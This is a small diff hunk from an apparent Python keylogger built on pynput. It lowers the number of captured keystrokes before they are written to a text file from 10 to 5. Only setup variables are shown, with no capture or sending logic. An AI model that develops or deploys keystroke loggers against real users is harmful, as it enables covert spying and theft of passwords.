@@ -3,7 +3,7 @@ import pynput
 from pynput.keyboard import Key, Listener
 
 count = 0                       #counter for keystrokes
-limiter = 10                    #number of keystrokes after where txt is written
+limiter = 5                    #number of keystrokes after where txt is written
 keys = []                       #list of kestrokes
 
 
